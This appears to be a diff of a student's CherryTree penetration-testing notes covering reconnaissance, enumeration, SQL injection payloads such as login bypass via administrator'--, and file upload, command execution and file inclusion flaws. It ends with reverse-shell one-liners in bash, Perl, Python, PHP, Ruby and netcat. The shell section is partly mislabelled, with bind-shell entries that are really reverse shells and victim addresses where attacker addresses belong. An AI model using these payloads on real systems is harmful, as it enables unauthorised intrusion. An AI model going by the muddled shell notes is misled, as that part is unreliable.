@@ -2,38 +2,390 @@
 <cherrytree>
   <bookmarks list=""/>
   <node name="Hacking Methodology" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1662140330" ts_lastsave="1662141362">
-    <node name="Information Gathering" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1662140371" ts_lastsave="1662140371"/>
-    <node name="Enamuration" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1662140385" ts_lastsave="1662140385"/>
-    <node name="Exploitation" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1662140415" ts_lastsave="1662147009">
-      <node name="SQLi" unique_id="7" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1662147009" ts_lastsave="1662149471">
-        <rich_text weight="heavy">SQLi</rich_text>
+    <node name="Reconnaissance / Information Gathering" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1662140371" ts_lastsave="1681232548">
+      <rich_text weight="heavy">Reconnaissance</rich_text>
+      <rich_text> (recon) can be defined as a preliminary survey to gather information about a target. It is the first step in The Unified Kill Chain to gain an initial foothold on a system. 
+There are two type of reconnaissance:      
+	1. Passive Reconnaissance     
+	2. Active Reconnaissance </rich_text>
+      <node name="Passive Reconnaissance" unique_id="17" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1681232490" ts_lastsave="1681251666">
+        <rich_text weight="heavy">Passive Reconnaissance:</rich_text>
+        <rich_text> In passive reconnaissance, you rely on publicly available knowledge. It is the knowledge that you can access from publicly available resources without directly engaging with the target. 
+	Passive reconnaissance example:
+            → Looking up DNS records of a domain from a public DNS server.
+            → Finding Websites on the same server
+            → Discovering subdomains of the website.
+            → Checking job ads related to the target website.
+            → Reading news articles about the target company.
+	
+	</rich_text>
+        <rich_text weight="heavy">Tools:</rich_text>
         <rich_text>
+            1. </rich_text>
+        <rich_text style="italic">whois
+            2. nslookup
+            3. dig
+            4. DNSDumpster
+            5. Shadon.io </rich_text>
+        <rich_text>  
+            6. </rich_text>
+        <rich_text link="webs https://whois.domaintools.com">https://whois.domaintools.com</rich_text>
+        <rich_text>
+            7. </rich_text>
+        <rich_text link="webs https://www.netcraft.com">https://www.netcraft.com</rich_text>
+        <rich_text>
+            8. </rich_text>
+        <rich_text link="webs https://www.robtex.com">https://www.robtex.com</rich_text>
+      </node>
+      <node name="Active Reconnaissance" unique_id="18" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1681232503" ts_lastsave="1681251715">
+        <rich_text weight="heavy">Active Reconnaissance:</rich_text>
+        <rich_text> Active reconnaissance requires you to make some kind of contact with your target. This contact can be a phone call or a visit to the target company under some pretence to gather more information, usually as part of social engineering. 
+	Active Reconnissance example: 
+            → Direct connection to the target system
+            → Visiting their website
+            → Checking if their firewall has an SSH port open.
+	
+	</rich_text>
+        <rich_text weight="heavy">Tools:</rich_text>
+        <rich_text>
+            1. </rich_text>
+        <rich_text style="italic">ping
+            2. traceroute
+            3. telnet
+            4. nc</rich_text>
+        <rich_text>
+            5. </rich_text>
+        <rich_text style="italic">Browser</rich_text>
+        <rich_text>	</rich_text>
+      </node>
+    </node>
+    <node name="Enumeration" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1662140385" ts_lastsave="1681288367">
+      <rich_text>Enumeration is the process of identifying and listing out the resources and services available on a target system or network. Enumeration involves techniques such as scanning ports, querying network services, and searching for vulnerabilities. The purpose of enumeration is to identify specific vulnerabilities and to gain a deeper understanding of the target system or network, which can be useful in planning a more targeted and effective attack.</rich_text>
+      <node name="Web" unique_id="15" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1663358549" ts_lastsave="1681288954">
+        <rich_text weight="heavy">Web Enamuration:</rich_text>
+        <rich_text> Web enumeration in pen-testing refers to the process of identifying and gathering information about web applications, their components, and their associated infrastructure. The purpose of web enumeration is to identify potential vulnerabilities that could be exploited by an attacker to gain unauthorized access or execute malicious code on the target system.
+
+	Web enamuration example:
+            → </rich_text>
+        <rich_text underline="single">Directory and File Enumeration:</rich_text>
+        <rich_text> This involves using tools to discover directories and files that are present on the target website, which can provide useful information about the website's structure and content.      
+            → </rich_text>
+        <rich_text underline="single">Web Server Enumeration:</rich_text>
+        <rich_text> This involves identifying the type and version of the web server used by the target website, as well as any other software or services that are running on the server.      
+            → </rich_text>
+        <rich_text underline="single">Application Enumeration:</rich_text>
+        <rich_text> This involves identifying the type and version of the web application used by the target website, as well as any other applications or services that are running on the server.      
+            → </rich_text>
+        <rich_text underline="single">Network Enumeration:</rich_text>
+        <rich_text> This involves identifying any other hosts or devices that are connected to the same network as the target website, which can provide useful information about the website's infrastructure.
+    
+    
+    </rich_text>
+        <rich_text weight="heavy">Tools:</rich_text>
+        <rich_text>
+            1. Nmap
+            2. Burp Suite
+            3. OWASP ZAP
+            4. Nikto
+            5. dirb
+            6. dirbuster
+            7. fuff             </rich_text>
+      </node>
+      <node name="Network" unique_id="16" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1663358578" ts_lastsave="1663358578"/>
+    </node>
+    <node name="Exploitation" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1662140415" ts_lastsave="1663358113">
+      <node name="Web" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1663358113" ts_lastsave="1681333246">
+        <node name="SQLi" unique_id="13" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663358259" ts_lastsave="1663358275">
+          <rich_text weight="heavy">SQLi</rich_text>
+          <rich_text>
 SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve.
 
 </rich_text>
-        <rich_text weight="heavy">Type:</rich_text>
-        <rich_text>
+          <rich_text weight="heavy">Type:</rich_text>
+          <rich_text>
 	1. In-band SQLi (Classic)
 	2. Inferential SQLi (Blind)
 	3. Out-of-band SQLi 
 	
 </rich_text>
-        <rich_text weight="heavy">• In-band SQLi (Classic)</rich_text>
-        <rich_text>
+          <rich_text weight="heavy">• In-band SQLi (Classic)</rich_text>
+          <rich_text>
 The attacker uses the same channel of communication to launch their attacks and to gather their results.
 Example:
 </rich_text>
-        <rich_text weight="heavy">   ◇ Retriving Hidden Data
+          <rich_text weight="heavy">   ◇ Retriving Hidden Data
+   	</rich_text>
+          <rich_text>		Consider in a website after clicking in a fish category the url is </rich_text>
+          <rich_text family="monospace" link="webs https://insecure-website.com/products?category=fish">https://insecure-website.com/products?category=fish</rich_text>
+          <rich_text>.  We further consider that in the sql query  in behind there is another variable </rich_text>
+          <rich_text style="italic" weight="heavy">relese</rich_text>
+          <rich_text weight="heavy"> </rich_text>
+          <rich_text>which determine that wether the product is released or not. In that case the qury will be </rich_text>
+          <rich_text family="monospace">SELECT * FROM products WHERE category='fish' AND relese=1</rich_text>
+          <rich_text>. Here if we can comment-out the </rich_text>
+          <rich_text style="italic" weight="heavy">relese=1</rich_text>
+          <rich_text>  condition we will see all the product which are not relesed also. To constract that attack url  </rich_text>
+          <rich_text family="monospace" link="webs https://insecure-website.com/products?category=fish'--">https://insecure-website.com/products?category=fish'--</rich_text>
+          <rich_text> can be browsed which constract the query </rich_text>
+          <rich_text family="monospace">SELECT * FROM products WHERE category='fish'--' AND relese=1</rich_text>
+          <rich_text>. Here comment sequence '</rich_text>
+          <rich_text style="italic" weight="heavy">--</rich_text>
+          <rich_text>'</rich_text>
+          <rich_text weight="heavy"> </rich_text>
+          <rich_text>commented out the </rich_text>
+          <rich_text style="italic" weight="heavy">relese=1</rich_text>
+          <rich_text weight="heavy"> </rich_text>
+          <rich_text>condition. Futher more we can see all the product of the entire website by url </rich_text>
+          <rich_text family="monospace" link="webs https://insecure-website.com/products?category=fish'+OR+1=1--">https://insecure-website.com/products?category=fish'+OR+1=1--</rich_text>
+          <rich_text> which construct the quey </rich_text>
+          <rich_text family="monospace">SELECT * FROM products WHERE category='fish' OR 1=1--' AND relese=1</rich_text>
+          <rich_text>. This is how we can retrive hidden data of a website.</rich_text>
+          <rich_text weight="heavy">
    ◇ Subnerting Application Logic
+   			</rich_text>
+          <rich_text>Consider in a web application user can login using username and password. If the field is not sanitized properly anyone can login without password but have to know valid username. Just by using comment sequence ‘</rich_text>
+          <rich_text style="italic" weight="heavy">--</rich_text>
+          <rich_text> ’ after the username. Suppose we have a user with username administrator. To attack we have to fillup the username field with </rich_text>
+          <rich_text style="italic" weight="heavy">administrator'--</rich_text>
+          <rich_text>.  In that case the query will be </rich_text>
+          <rich_text family="monospace">SELECT * FROM users WHERE username = 'administrator'--' AND password = ‘’</rich_text>
+          <rich_text> which will bypass the password checking condition.</rich_text>
+          <rich_text weight="heavy">
    ◇ Retriving Data From Another Database Tables (Union Attack)</rich_text>
-        <rich_text>
-   		 When an application is vulnerable to SQL injection and the results of the query are returned within the application's responses, the UNION keyword can be used to retrieve data from other tables within the database. This results in an SQL injection UNION attack.  The UNION keyword lets you execute one or more additional SELECT queries and append the results to the original query. 
+          <rich_text>
+   			When an application is vulnerable to SQL injection and the results of the query are returned within the application's responses, the UNION keyword can be used to retrieve data from other tables within the database. This results in an SQL injection UNION attack.  The UNION keyword lets you execute one or more additional SELECT queries and append the results to the original query. 
    		For example, </rich_text>
-        <rich_text family="monospace">SELECT a, b FROM table1 UNION SELECT c, d FROM table2</rich_text>
-        <rich_text>
+          <rich_text family="monospace">SELECT a, b FROM table1 UNION SELECT c, d FROM table2</rich_text>
+          <rich_text>
    		For a UNION attack to work 2 requirements must be met:
                1. Individual queries must return same number of columns.
-                  1) The data type of each column must be compatible between the individual q</rich_text>
+               2. The data type of each column must be compatible between the individual queries.
+               </rich_text>
+        </node>
+        <node name="Authentication Vulnerability" unique_id="14" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663358275" ts_lastsave="1681289076">
+          <rich_text>Authentication is the process of verifying the identity of a given user or client. In other words, it involves making sure that they really are who they claim to be.
+There are 3 type of authentication 
+            1. knowledge factors: Something you know(password)
+            2. possession factors: Something you posses(security token)
+            3. inherence factors: Something you are(biometric pattern like fingerprint, retina)
+
+Most vulnerabilities in authentication mechanisms arise in one of two ways:
+            1. The authentication mechanisms are weak because they fail to adequately protect against brute-force attacks.
+            2. Logic flaws or poor coding in the implementation allow the authentication mechanisms to be bypassed entirely by an attacker. This is sometimes referred to as "broken authentication".
+
+</rich_text>
+          <rich_text weight="heavy">Vulnerabilities in authentication mechanisms:</rich_text>
+          <rich_text>
+        → Password-based login
+        → Multifactor authentication
+        → Othe authentication</rich_text>
+        </node>
+        <node name="File Upload" unique_id="19" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1681251996" ts_lastsave="1681330467">
+          <rich_text weight="heavy">File Upload:</rich_text>
+          <rich_text> File upload exploitation on a website is a type of web exploitation where an attacker takes advantage of vulnerabilities in the website's file upload functionality to upload malicious files to the server.
+
+</rich_text>
+          <rich_text weight="heavy">Reasons:</rich_text>
+          <rich_text> When a user uploads a file to a website, the server typically checks the file's type and size to ensure it meets the website's requirements. However, if the server does not properly validate the file's content, an attacker can upload a malicious file, such as a script, malware, or backdoor, that can compromise the website's security. Other reasons behind file upload vulnerabilities may include using outdated or vulnerable software or plugins, misconfigured server settings, or failure to follow security best practices during web application development.
+
+</rich_text>
+          <rich_text weight="heavy">Methodologies:</rich_text>
+          <rich_text> Methodologies to exploit file upload vulnerabilities can vary depending on the specific vulnerability, but may include using a file with a specially crafted name or content to bypass validation checks, or using a tool to automate the process of uploading malicious files to the server.
+	</rich_text>
+          <rich_text weight="heavy">Tools:</rich_text>
+          <rich_text>
+            1. Burp Suite
+            2. OWASP Zed Attack Proxy (ZAP)
+            3. weevely
+            4. metasploit
+            5. veil
+
+</rich_text>
+          <rich_text weight="heavy">Prevention:</rich_text>
+          <rich_text> To prevent file upload exploitation vulnerabilities, website administrators should implement secure file upload functionality that includes validation checks to ensure uploaded files are safe and restricted to specific file types, sizes, and locations. This can be done by implementing server-side validation checks and filtering out file types that are known to be potentially malicious, such as executable files or scripts. Additionally, website administrators should regularly monitor their website for any unusual file uploads or suspicious activity, and keep all software and plugins up-to-date to prevent known vulnerabilities. It is also recommended to use a web application firewall (WAF) to detect and block attacks before they can reach the web server.</rich_text>
+        </node>
+        <node name="Command Execution" unique_id="20" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1681287860" ts_lastsave="1681330463">
+          <rich_text weight="heavy">Command Execution:</rich_text>
+          <rich_text> Command execution vulnerability on a website is a type of security vulnerability that occurs when an attacker is able to execute arbitrary commands on the web server or application. This can happen due to a weakness in the code or configuration of the system, which allows the attacker to inject and execute commands.
+
+</rich_text>
+          <rich_text weight="heavy">Reasons:</rich_text>
+          <rich_text> The reasons behind command execution vulnerabilities can include insufficient input validation, allowing user input to be directly passed to the operating system's command interpreter, or the use of unsafe programming practices.
+
+</rich_text>
+          <rich_text weight="heavy">Methodologies:</rich_text>
+          <rich_text> The methodology to exploit command execution vulnerabilities typically involves injecting specially crafted input, such as command-line arguments, into the website or web application, causing the server to execute arbitrary commands. The attacker may use various techniques, such as exploiting file upload vulnerabilities, exploiting SQL injection vulnerabilities, or leveraging misconfigured server settings to execute commands.
+	</rich_text>
+          <rich_text weight="heavy">Tools:</rich_text>
+          <rich_text>
+            1. weevely
+            2. metasploit
+            3. veil
+
+</rich_text>
+          <rich_text weight="heavy">Prevention:</rich_text>
+          <rich_text> To prevent command execution vulnerabilities, website administrators should implement secure coding practices, such as input validation and sanitization, and use secure coding frameworks and libraries. Additionally, they should limit user input to known safe characters, avoid passing user input directly to the command-line interpreter, and use appropriate access controls and permissions to limit the impact of potential breaches. It is also important to keep all software and plugins up-to-date to prevent known vulnerabilities, and to implement intrusion detection and prevention systems to monitor for and block potential attacks.
+
+
+
+
+
+
+</rich_text>
+        </node>
+        <node name="File Inclusion" unique_id="21" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1681315486" ts_lastsave="1681330128">
+          <rich_text weight="heavy">File inclusion:</rich_text>
+          <rich_text> File inclusion vulnerability on a website is a type of security vulnerability that allows an attacker to include and execute arbitrary files on the web server or application. This can happen due to a weakness in the code or configuration of the system, which allows the attacker to inject their own code into the website.
+	Types of file inclusion vulnerabilities: 
+            1. </rich_text>
+          <rich_text underline="single">Local File Inclusion (LFI):</rich_text>
+          <rich_text> LFI occurs when an attacker is able to include files on the same server as the vulnerable application.
+            2. </rich_text>
+          <rich_text underline="single">Remote File Inclusion (RFI):</rich_text>
+          <rich_text> RFI occurs when an attacker is able to include files from a remote server.
+
+</rich_text>
+          <rich_text weight="heavy">Reasons:</rich_text>
+          <rich_text> The reasons behind file inclusion vulnerabilities can include inadequate input validation, allowing user input to be directly passed to file system access functions, or the use of unsafe programming practices.
+
+</rich_text>
+          <rich_text weight="heavy">Methodologies:</rich_text>
+          <rich_text> The methodology to exploit file inclusion vulnerabilities typically involves injecting specially crafted input, such as file paths or URLs, into the website or web application, causing the server to include and execute arbitrary files. The attacker may use various techniques, such as using directory traversal to bypass access controls, injecting PHP code into a web page, or exploiting a misconfigured server to execute arbitrary code.
+	</rich_text>
+          <rich_text weight="heavy">Tools:</rich_text>
+          <rich_text> 
+            1. Metasploit
+            2. Burp Suite
+            3. OWASP Zed Attack Proxy (ZAP)
+
+</rich_text>
+          <rich_text weight="heavy">Prevention:</rich_text>
+          <rich_text> To prevent file inclusion vulnerabilities, website administrators should implement secure coding practices, such as input validation and sanitization, and use secure coding frameworks and libraries. Additionally, they should avoid using user input to construct file paths or URLs, and use appropriate access controls and permissions to limit the impact of potential breaches. It is also important to keep all software and plugins up-to-date to prevent known vulnerabilities, and to implement intrusion detection and prevention systems to monitor for and block potential attacks.
+
+
+
+</rich_text>
+        </node>
+        <node name="Shells" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1681333246" ts_lastsave="1681333944">
+          <rich_text>A shell is a program that provides a command-line interface for interacting with an operating system. It allows users to execute commands, manipulate files and directories, and perform other tasks on a computer. In the context of network security and penetration testing, a shell is often used to gain remote access to a target machine.
+	Types of shells in terms of attack:
+            1. Bind Shell
+            2. Reverse Shell</rich_text>
+          <node name="Bind Shell" unique_id="23" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1681333932" ts_lastsave="1681338073">
+            <rich_text weight="heavy">Bind Shell:</rich_text>
+            <rich_text> A bind shell is a type of shell that listens for incoming connections on a specific port on a victim machine. Once a connection is established, the attacker can execute commands on the victim machine as if they were sitting at the command prompt. Bind shells have the </rich_text>
+            <rich_text underline="single" style="italic">listener running on the target(victim)</rich_text>
+            <rich_text> and the </rich_text>
+            <rich_text underline="single" style="italic">attacker connect to the listener</rich_text>
+            <rich_text> in order to gain a remote shell.
+	
+	</rich_text>
+            <rich_text style="italic" weight="heavy">Listener:</rich_text>
+            <rich_text>
+         1. </rich_text>
+            <rich_text style="italic">Netcat:</rich_text>
+            <rich_text>
+             → </rich_text>
+            <rich_text family="monospace" foreground="#c6c646460000">nc -lnvp &lt;port&gt;</rich_text>
+            <rich_text>
+
+	</rich_text>
+            <rich_text style="italic" weight="heavy">Attacker:</rich_text>
+            <rich_text>
+		1. </rich_text>
+            <rich_text style="italic">Bash</rich_text>
+            <rich_text>:
+            → </rich_text>
+            <rich_text family="monospace" foreground="#c6c646460000">bash -i &gt;&amp; /dev/tcp/&lt;victim-ip&gt;/&lt;port&gt; 0&gt;&amp;1</rich_text>
+            <rich_text>
+		2. </rich_text>
+            <rich_text style="italic">Perl</rich_text>
+            <rich_text>:
+            → </rich_text>
+            <rich_text family="monospace" foreground="#c6c646460000">perl -e 'use Socket;$i="&lt;victim-ip&gt;";$p=&lt;port&gt;;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</rich_text>
+            <rich_text>
+		3. </rich_text>
+            <rich_text style="italic">Python:</rich_text>
+            <rich_text>
+            → </rich_text>
+            <rich_text family="monospace" foreground="#c6c646460000">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;victim-ip&gt;",&lt;port&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</rich_text>
+            <rich_text>
+		4. </rich_text>
+            <rich_text style="italic">Php:</rich_text>
+            <rich_text>
+            → </rich_text>
+            <rich_text family="monospace" foreground="#c6c646460000">php -r '$sock=fsockopen("&lt;victim-ip&gt;",&lt;port&gt;);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</rich_text>
+            <rich_text>
+		5. </rich_text>
+            <rich_text style="italic">Ruby:</rich_text>
+            <rich_text>
+            → </rich_text>
+            <rich_text family="monospace" foreground="#c6c646460000">ruby -rsocket -e'f=TCPSocket.open("&lt;victim-ip&gt;",&lt;port&gt;).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</rich_text>
+            <rich_text>
+		6. </rich_text>
+            <rich_text style="italic">Netcat:</rich_text>
+            <rich_text>
+            → </rich_text>
+            <rich_text family="monospace" foreground="#c6c646460000">nc -e /bin/sh &lt;victim-ip&gt; &lt;port&gt;</rich_text>
+          </node>
+          <node name="Reverse Shell" unique_id="24" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1681333944" ts_lastsave="1681338143">
+            <rich_text weight="heavy">Reverse Shell:</rich_text>
+            <rich_text> A reverse shell, on the other hand, is a type of shell in which the victim machine initiates the connection to the attacker's machine. This is useful when the victim machine is behind a firewall or NAT and cannot be directly accessed from the attacker's machine. The attacker typically listens on a port for incoming connections and waits for the victim to connect to it, at which point they can execute commands on the victim machine. Reverse shells have the </rich_text>
+            <rich_text underline="single" style="italic">listener running on the attacker</rich_text>
+            <rich_text> and the </rich_text>
+            <rich_text underline="single" style="italic">target connects to the attacker</rich_text>
+            <rich_text> with a shell.
+
+	</rich_text>
+            <rich_text style="italic" weight="heavy">Listener (Attacker):</rich_text>
+            <rich_text>
+         1. </rich_text>
+            <rich_text style="italic">Netcat:</rich_text>
+            <rich_text>
+             → </rich_text>
+            <rich_text family="monospace" foreground="#c6c646460000">nc -lnvp &lt;port&gt;</rich_text>
+            <rich_text>
+
+	</rich_text>
+            <rich_text style="italic" weight="heavy">Victim:</rich_text>
+            <rich_text>
+		1. </rich_text>
+            <rich_text style="italic">Bash</rich_text>
+            <rich_text>:
+            → </rich_text>
+            <rich_text family="monospace" foreground="#c6c646460000">bash -i &gt;&amp; /dev/tcp/&lt;victim-ip&gt;/&lt;port&gt; 0&gt;&amp;1</rich_text>
+            <rich_text>
+		2. </rich_text>
+            <rich_text style="italic">Perl</rich_text>
+            <rich_text>:
+            → </rich_text>
+            <rich_text family="monospace" foreground="#c6c646460000">perl -e 'use Socket;$i="&lt;victim-ip&gt;";$p=&lt;port&gt;;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</rich_text>
+            <rich_text>
+		3. </rich_text>
+            <rich_text style="italic">Python:</rich_text>
+            <rich_text>
+            → </rich_text>
+            <rich_text family="monospace" foreground="#c6c646460000">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;victim-ip&gt;",&lt;port&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</rich_text>
+            <rich_text>
+		4. </rich_text>
+            <rich_text style="italic">Php:</rich_text>
+            <rich_text>
+            → </rich_text>
+            <rich_text family="monospace" foreground="#c6c646460000">php -r '$sock=fsockopen("&lt;victim-ip&gt;",&lt;port&gt;);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</rich_text>
+            <rich_text>
+		5. </rich_text>
+            <rich_text style="italic">Ruby:</rich_text>
+            <rich_text>
+            → </rich_text>
+            <rich_text family="monospace" foreground="#c6c646460000">ruby -rsocket -e'f=TCPSocket.open("&lt;victim-ip&gt;",&lt;port&gt;).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</rich_text>
+            <rich_text>
+		6. </rich_text>
+            <rich_text style="italic">Netcat:</rich_text>
+            <rich_text>
+            → </rich_text>
+            <rich_text family="monospace" foreground="#c6c646460000">nc -e /bin/sh &lt;victim-ip&gt; &lt;port&gt;</rich_text>
+          </node>
+        </node>
       </node>
     </node>
     <node name="Privilage Escalation" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1662140432" ts_lastsave="1662140437"/>
